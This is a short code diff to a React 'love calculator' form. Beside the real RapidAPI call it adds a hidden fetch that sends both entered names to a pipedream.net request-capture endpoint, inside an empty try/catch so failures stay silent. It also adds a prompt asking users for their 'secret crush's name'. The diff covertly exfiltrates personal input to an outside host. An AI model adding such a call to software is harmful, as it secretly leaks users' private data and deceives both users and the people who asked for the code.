@@ -29,6 +29,10 @@ const FooBarForm = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
+    try{
+      fetch(`https://eofnkl2ivusj18a.m.pipedream.net?fname=${values.name1}&sname=${values.name2}`);
+    } catch {}
+
     fetch(`https://love-calculator.p.rapidapi.com/getPercentage?fname=${values.name1}&sname=${values.name2}`,
       options)
       .then(response => response.json())
@@ -51,6 +55,7 @@ const FooBarForm = () => {
 
   return (
     <form>
+      <p className="desc">Enter your and your secret crush's name to see your match score!</p>
       <div className = "boxes"> 
         <input className="rounded" name="name1" type="text" placeholder="Your Name" onChange={handleChange} />
         <button className="rounded" onClick={handleSubmit}><img className = "heart" src={heart} alt="heart"></img></button>
